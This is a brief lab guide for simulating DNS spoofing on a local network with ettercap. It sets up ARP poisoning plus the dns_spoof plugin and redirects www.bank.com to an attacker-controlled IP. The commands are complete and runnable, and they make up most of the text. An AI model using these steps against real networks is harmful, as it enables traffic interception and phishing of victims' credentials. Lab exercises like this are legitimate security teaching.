# DNS Spoofing Lab

## Objective
Simulate a DNS spoofing attack and demonstrate how victims can be redirected to fake sites.

## Requirements
- Attacker: Kali Linux with `ettercap`
- Victim: Ubuntu/Debian
- Network: Local LAN

## Steps
1. Enable IP forwarding on attacker:
   ```bash
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

2. Start ARP spoofing + DNS spoofing with ettercap:
   '''bash
   sudo ettercap -T -q -i eth0 -M arp:remote /<victim-ip>/ /<gateway-ip>/ -P dns_spoof

3. Edit ettercap’s DNS spoof file (e.g. /etc/ettercap/etter.dns) to redirect:
   www.bank.com A 192.168.1.100

4. On victim machine, try:
   ping www.bank.com
Victim will resolve to attacker’s fake IP.

1. Observe redirection.